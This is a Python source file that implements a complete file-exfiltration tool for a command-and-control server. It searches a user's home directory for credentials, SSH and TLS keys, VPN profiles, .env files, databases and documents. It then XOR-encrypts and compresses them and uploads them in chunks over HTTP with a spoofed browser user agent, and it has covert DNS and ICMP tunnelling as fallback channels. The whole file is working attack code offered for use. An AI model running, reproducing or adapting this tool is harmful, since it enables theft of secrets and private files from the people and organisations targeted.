#!/usr/bin/env python3
"""
FILE EXFILTRATION - Secure file extraction and transmission to C2.
Supports: Chunked upload, encryption, compression, stealth protocols.
"""

import os
import sys
import json
import time
import base64
import hashlib
import zlib
import threading
import subprocess
import platform
import urllib.request
import urllib.error
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from pathlib import Path
import io
import tempfile
import shutil

class FileExfiltration:
    """Secure file exfiltration to C2 server."""
    
    def __init__(self, c2_url: str = None, encryption_key: str = None):
        self.c2_url = c2_url or os.environ.get("C2_URL", "http://127.0.0.1:5000")
        self.encryption_key = encryption_key or os.environ.get("ENC_KEY", "default_key_12345")
        self.chunk_size = 1024 * 1024  # 1MB chunks
        self.max_file_size = 100 * 1024 * 1024  # 100MB max
        
        # Statistics
        self.stats = {
            "files_sent": 0,
            "bytes_sent": 0,
            "errors": [],
            "start_time": None
        }
        
        # Temp directory for staging
        self.temp_dir = tempfile.mkdtemp(prefix=".system_cache_")
    
    # ─── ENCRYPTION ────────────────────────────────────────────────────
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """Simple XOR encryption."""
        key = self.encryption_key.encode()
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    
    def _xor_decrypt(self, data: bytes) -> bytes:
        """XOR decryption (same as encrypt)."""
        return self._xor_encrypt(data)
    
    def _compress(self, data: bytes) -> bytes:
        """Compress data with zlib."""
        return zlib.compress(data, level=9)
    
    def _decompress(self, data: bytes) -> bytes:
        """Decompress data."""
        return zlib.decompress(data)
    
    def _prepare_data(self, data: bytes) -> bytes:
        """Compress and encrypt data."""
        compressed = self._compress(data)
        encrypted = self._xor_encrypt(compressed)
        return encrypted
    
    def _restore_data(self, data: bytes) -> bytes:
        """Decrypt and decompress data."""
        decrypted = self._xor_decrypt(data)
        decompressed = self._decompress(decrypted)
        return decompressed
    
    # ─── FILE OPERATIONS ───────────────────────────────────────────────
    
    def read_file(self, filepath: str) -> Optional[bytes]:
        """Read file content."""
        try:
            with open(filepath, "rb") as f:
                return f.read()
        except Exception as e:
            self.stats["errors"].append(f"Read error: {e}")
            return None
    
    def write_file(self, filepath: str, data: bytes) -> bool:
        """Write data to file."""
        try:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, "wb") as f:
                f.write(data)
            return True
        except Exception as e:
            self.stats["errors"].append(f"Write error: {e}")
            return False
    
    def get_file_hash(self, filepath: str) -> str:
        """Calculate file SHA256 hash."""
        sha256 = hashlib.sha256()
        try:
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except:
            return ""
    
    def get_file_info(self, filepath: str) -> Dict:
        """Get file metadata."""
        try:
            stat = os.stat(filepath)
            return {
                "path": filepath,
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                "accessed": datetime.fromtimestamp(stat.st_atime).isoformat(),
                "hash": self.get_file_hash(filepath),
                "exists": True
            }
        except Exception as e:
            return {"path": filepath, "exists": False, "error": str(e)}
    
    # ─── CHUNKING ──────────────────────────────────────────────────────
    
    def chunk_file(self, filepath: str) -> List[Dict]:
        """Split file into chunks for transmission."""
        chunks = []
        
        try:
            file_info = self.get_file_info(filepath)
            if not file_info["exists"]:
                return chunks
            
            file_size = file_info["size"]
            if file_size > self.max_file_size:
                self.stats["errors"].append(f"File too large: {filepath}")
                return chunks
            
            file_id = hashlib.md5(f"{filepath}{time.time()}".encode()).hexdigest()[:12]
            
            with open(filepath, "rb") as f:
                chunk_index = 0
                while True:
                    chunk_data = f.read(self.chunk_size)
                    if not chunk_data:
                        break
                    
                    # Prepare chunk
                    prepared = self._prepare_data(chunk_data)
                    chunk_b64 = base64.b64encode(prepared).decode()
                    
                    chunks.append({
                        "file_id": file_id,
                        "filename": os.path.basename(filepath),
                        "filepath": filepath,
                        "chunk_index": chunk_index,
                        "total_chunks": (file_size + self.chunk_size - 1) // self.chunk_size,
                        "chunk_size": len(chunk_data),
                        "prepared_size": len(prepared),
                        "data": chunk_b64,
                        "hash": hashlib.md5(chunk_data).hexdigest()
                    })
                    
                    chunk_index += 1
        
        except Exception as e:
            self.stats["errors"].append(f"Chunk error: {e}")
        
        return chunks
    
    # ─── TRANSMISSION ─────────────────────────────────────────────────
    
    def send_chunk(self, chunk: Dict, endpoint: str = "/api/exfil/chunk") -> Dict:
        """Send a single chunk to C2."""
        result = {"success": False, "error": None}
        
        try:
            url = f"{self.c2_url}{endpoint}"
            
            payload = {
                "file_id": chunk["file_id"],
                "filename": chunk["filename"],
                "filepath": chunk["filepath"],
                "chunk_index": chunk["chunk_index"],
                "total_chunks": chunk["total_chunks"],
                "size": chunk["chunk_size"],
                "data": chunk["data"],
                "hash": chunk["hash"]
            }
            
            data = json.dumps(payload).encode()
            
            req = urllib.request.Request(
                url,
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                    "X-Auth-Token": os.environ.get("AUTH_TOKEN", "")
                },
                method="POST"
            )
            
            resp = urllib.request.urlopen(req, timeout=60)
            response = json.loads(resp.read().decode())
            
            result["success"] = True
            result["response"] = response
        
        except urllib.error.HTTPError as e:
            result["error"] = f"HTTP {e.code}"
        except urllib.error.URLError as e:
            result["error"] = f"URL error: {e.reason}"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def send_file(self, filepath: str, endpoint: str = "/api/exfil/chunk") -> Dict:
        """Send entire file to C2 (chunked)."""
        result = {
            "success": False,
            "filepath": filepath,
            "chunks_sent": 0,
            "errors": []
        }
        
        chunks = self.chunk_file(filepath)
        if not chunks:
            result["errors"].append("No chunks created")
            return result
        
        for chunk in chunks:
            chunk_result = self.send_chunk(chunk, endpoint)
            
            if chunk_result["success"]:
                result["chunks_sent"] += 1
                self.stats["bytes_sent"] += chunk["chunk_size"]
            else:
                result["errors"].append(f"Chunk {chunk['chunk_index']}: {chunk_result['error']}")
        
        if result["chunks_sent"] == len(chunks):
            result["success"] = True
            self.stats["files_sent"] += 1
        
        return result
    
    def send_files(self, filepaths: List[str], endpoint: str = "/api/exfil/chunk") -> List[Dict]:
        """Send multiple files."""
        results = []
        
        for filepath in filepaths:
            result = self.send_file(filepath, endpoint)
            results.append(result)
            
            # Delay between files
            time.sleep(1)
        
        return results
    
    # ─── STEALTH TRANSMISSION ────────────────────────────────────────
    
    def send_via_dns(self, filepath: str, dns_server: str = None) -> Dict:
        """Exfiltrate file via DNS queries (slow but stealthy)."""
        result = {"success": False, "queries": 0}
        
        # DNS exfil requires a DNS server that logs queries
        # This is a simplified implementation
        
        try:
            import socket
            import struct
            
            dns = dns_server or "8.8.8.8"
            
            # Read and encode file
            data = self.read_file(filepath)
            if not data:
                return result
            
            prepared = self._prepare_data(data)
            encoded = base64.b32encode(prepared).decode().lower()
            
            # Split into DNS labels (max 63 chars each)
            chunk_size = 60
            domain = "exfil.c2.local"  # C2's DNS domain
            
            for i in range(0, len(encoded), chunk_size):
                label = encoded[i:i+chunk_size]
                query = f"{label}.{domain}"
                
                # Send DNS query
                try:
                    # Build DNS query packet
                    packet = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
                    for part in query.split("."):
                        packet += struct.pack("B", len(part)) + part.encode()
                    packet += struct.pack("!HH", 0, 1)  # Type A
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(packet, (dns, 53))
                    sock.close()
                    
                    result["queries"] += 1
                    time.sleep(0.1)  # Rate limit
                    
                except Exception as e:
                    pass
            
            result["success"] = True
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def send_via_icmp(self, filepath: str, target: str = None) -> Dict:
        """Exfiltrate file via ICMP echo (very slow but stealthy)."""
        result = {"success": False, "packets": 0}
        
        try:
            import socket
            import struct
            
            target = target or self.c2_url.replace("http://", "").replace("https://", "").split(":")[0]
            
            data = self.read_file(filepath)
            if not data:
                return result
            
            prepared = self._prepare_data(data)
            
            # ICMP packet structure
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            chunk_size = 64  # Small chunks for ICMP
            seq = 0
            
            for i in range(0, len(prepared), chunk_size):
                chunk = prepared[i:i+chunk_size]
                
                # ICMP header: type(1), code(1), checksum(2), id(2), seq(2)
                header = struct.pack("!BBHHH", 8, 0, 0, 0x1234, seq)
                packet = header + chunk
                
                # Calculate checksum
                checksum = self._icmp_checksum(packet)
                header = struct.pack("!BBHHH", 8, 0, checksum, 0x1234, seq)
                packet = header + chunk
                
                sock.sendto(packet, (target, 0))
                result["packets"] += 1
                seq += 1
                
                time.sleep(0.05)  # Rate limit
            
            sock.close()
            result["success"] = True
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _icmp_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b'\x00'
        
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        
        return ~s & 0xffff
    
    # ─── FILE DISCOVERY ───────────────────────────────────────────────
    
    def find_sensitive_files(self, root: str = None, patterns: List[str] = None,
                             max_files: int = 100) -> List[str]:
        """Find sensitive files by pattern."""
        root = root or str(Path.home())
        
        if not patterns:
            patterns = [
                # Documents
                "*.doc", "*.docx", "*.pdf", "*.txt", "*.rtf",
                "*.xls", "*.xlsx", "*.ppt", "*.pptx",
                # Credentials
                "*credential*", "*password*", "*secret*", "*token*",
                "*.pem", "*.key", "*.p12", "*.pfx", "*.crt",
                "id_rsa*", "*.ppk", "*.ovpn",
                # Configs
                "*.conf", "*.cfg", "*.ini", "*.yaml", "*.yml", "*.json",
                ".env*", "*.env",
                # Databases
                "*.db", "*.sqlite", "*.sqlite3",
                # Archives
                "*.zip", "*.tar", "*.gz", "*.rar", "*.7z",
            ]
        
        found = []
        
        for pattern in patterns:
            try:
                for filepath in Path(root).rglob(pattern):
                    if filepath.is_file():
                        size = filepath.stat().st_size
                        if size < self.max_file_size:  # Skip huge files
                            found.append(str(filepath))
                            if len(found) >= max_files:
                                return found
            except:
                pass
        
        return found
    
    def find_recent_files(self, root: str = None, hours: int = 24,
                          max_files: int = 100) -> List[str]:
        """Find recently modified files."""
        root = root or str(Path.home())
        found = []
        cutoff = time.time() - (hours * 3600)
        
        try:
            for filepath in Path(root).rglob("*"):
                if filepath.is_file():
                    try:
                        mtime = filepath.stat().st_mtime
                        size = filepath.stat().st_size
                        
                        if mtime > cutoff and size < self.max_file_size:
                            found.append(str(filepath))
                            if len(found) >= max_files:
                                break
                    except:
                        pass
        except:
            pass
        
        return found
    
    # ─── BATCH EXFIL ──────────────────────────────────────────────────
    
    def exfiltrate_sensitive(self, root: str = None) -> Dict:
        """Find and exfiltrate all sensitive files."""
        result = {
            "files_found": 0,
            "files_sent": 0,
            "errors": []
        }
        
        files = self.find_sensitive_files(root)
        result["files_found"] = len(files)
        
        for filepath in files:
            send_result = self.send_file(filepath)
            if send_result["success"]:
                result["files_sent"] += 1
            else:
                result["errors"].append(filepath)
        
        return result
    
    # ─── UTILITIES ────────────────────────────────────────────────────
    
    def get_stats(self) -> Dict:
        """Get exfiltration statistics."""
        return self.stats
    
    def cleanup(self):
        """Clean up temporary files."""
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="File Exfiltration")
    parser.add_argument("--file", "-f", help="File to exfiltrate")
    parser.add_argument("--dir", "-d", help="Directory to scan")
    parser.add_argument("--find", action="store_true", help="Find sensitive files")
    parser.add_argument("--recent", type=int, help="Find recent files (hours)")
    parser.add_argument("--c2", help="C2 server URL")
    parser.add_argument("--dns", help="Exfiltrate via DNS")
    parser.add_argument("--icmp", help="Exfiltrate via ICMP")
    
    args = parser.parse_args()
    
    exfil = FileExfiltration(args.c2)
    
    if args.find:
        files = exfil.find_sensitive_files(args.dir)
        print(f"[*] Found {len(files)} sensitive files:")
        for f in files[:20]:
            print(f"  {f}")
    
    elif args.recent:
        files = exfil.find_recent_files(args.dir, args.recent)
        print(f"[*] Found {len(files)} recent files:")
        for f in files[:20]:
            print(f"  {f}")
    
    elif args.file:
        if args.dns:
            result = exfil.send_via_dns(args.file, args.dns)
        elif args.icmp:
            result = exfil.send_via_icmp(args.file, args.icmp)
        else:
            result = exfil.send_file(args.file)
        
        print(json.dumps(result, indent=2))
    
    else:
        print("Usage: file_exfil.py --file <path> [--c2 <url>]")
